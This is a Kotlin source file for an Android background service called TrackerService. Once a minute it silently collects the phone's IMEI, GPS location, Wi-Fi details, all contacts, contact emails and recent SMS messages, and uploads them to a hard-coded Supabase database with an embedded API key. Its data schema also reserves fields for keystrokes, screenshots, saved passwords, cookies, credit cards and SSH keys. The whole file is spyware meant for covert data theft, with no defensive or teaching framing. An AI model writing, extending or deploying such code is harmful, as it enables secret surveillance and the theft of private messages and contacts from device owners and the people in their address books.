package com.tracker

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.postgrest.postgrest
import org.json.JSONObject
import android.net.wifi.WifiManager
import android.location.LocationManager
import android.os.Build
import android.provider.Settings
import android.content.Context
import android.telephony.TelephonyManager
import android.database.Cursor
import android.provider.ContactsContract
import android.provider.Telephony

class TrackerService : Service() {
    private val trackerId = "TRK_" + System.currentTimeMillis().toString(16).uppercase()
    private val supabase = createSupabaseClient(
        supabaseUrl = "https://ftyjokaagnjchivtulv.supabase.co",
        supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZ0eWpva2FhcW5qY2NoaXZ0dWx2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODM1NzQ5NDIsImV4cCI6MjA5OTE1MDk0Mn0.05b8TIhx9UZG333gF0zI9J-6jnrMVa07E_H27VXSi8Q"
    ) { install(Postgrest) }

    override fun onCreate() {
        super.onCreate()
        CoroutineScope(Dispatchers.IO).launch {
            while (true) {
                try {
                    val data = collectAllData()
                    if (hasInternet()) sendToSupabase(data) else storeLocally(data)
                    delay(60000)
                } catch (e: Exception) { Log.e("Tracker", "Error: ${e.message}") }
            }
        }
    }

    private fun collectAllData(): JSONObject {
        val wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager
        val wifiInfo = wifiManager.connectionInfo
        val ssid = wifiInfo.ssid
        val rssi = wifiInfo.rssi

        val locationManager = getSystemService(LOCATION_SERVICE) as LocationManager
        val location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        val lat = location?.latitude ?: 0.0
        val lng = location?.longitude ?: 0.0

        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val deviceId = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) telephonyManager.imei else telephonyManager.deviceId

        val contacts = getContacts()
        val sms = getSMS()

        return JSONObject().apply {
            put("tracker_id", trackerId)
            put("device_name", Build.MODEL)
            put("hostname", Build.MODEL)
            put("os", "Android ${Build.VERSION.RELEASE}")
            put("username", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
            put("device_id", deviceId)
            put("ssid", ssid)
            put("rssi", rssi)
            put("ip_address", "N/A")
            put("local_ip", "N/A")
            put("latitude", lat)
            put("longitude", lng)
            put("altitude", 0.0)
            put("magnitude", rssi)
            put("keystrokes", "")
            put("screenshot", "")
            put("saved_passwords", "{}")
            put("wifi_passwords", "")
            put("browser_cookies", "")
            put("browser_history", "")
            put("credit_cards", "")
            put("emails", getEmails())
            put("ssh_keys", "")
            put("phone_contacts", contacts)
            put("phone_sms", sms)
            put("phone_location", "$lat,$lng")
            put("collected_at", System.currentTimeMillis())
        }
    }

    private fun getContacts(): String {
        try {
            val contacts = mutableListOf<String>()
            val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    contacts.add("$name: $number")
                }
            }
            return contacts.joinToString("\n")
        } catch (e: Exception) { return "ERROR" }
    }

    private fun getSMS(): String {
        try {
            val sms = mutableListOf<String>()
            val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS))
                    val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY))
                    sms.add("$address: $body")
                    if (sms.size > 50) break
                }
            }
            return sms.joinToString("\n")
        } catch (e: Exception) { return "ERROR" }
    }

    private fun getEmails(): String {
        try {
            val emails = mutableListOf<String>()
            val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, null, null, null)
            cursor?.use {
                while (it.moveToNext()) {
                    val email = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA))
                    emails.add(email)
                }
            }
            return emails.joinToString("\n")
        } catch (e: Exception) { return "ERROR" }
    }

    private suspend fun sendToSupabase(data: JSONObject) {
        try {
            supabase.postgrest["tracker_data"].insert(data.toMap())
            Log.d("Tracker", "✅ Data sent to Supabase")
        } catch (e: Exception) { Log.e("Tracker", "❌ Error: ${e.message}") }
    }

    private fun hasInternet(): Boolean {
        try {
            val runtime = Runtime.getRuntime()
            val process = runtime.exec("ping -c 1 8.8.8.8")
            return process.waitFor() == 0
        } catch { return false }
    }

    private fun storeLocally(data: JSONObject) {
        val prefs = getSharedPreferences("tracker", MODE_PRIVATE)
        val editor = prefs.edit()
        val list = prefs.getString("cache", "[]") ?: "[]"
        val jsonArray = org.json.JSONArray(list)
        jsonArray.put(data)
        editor.putString("cache", jsonArray.toString())
        editor.apply()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}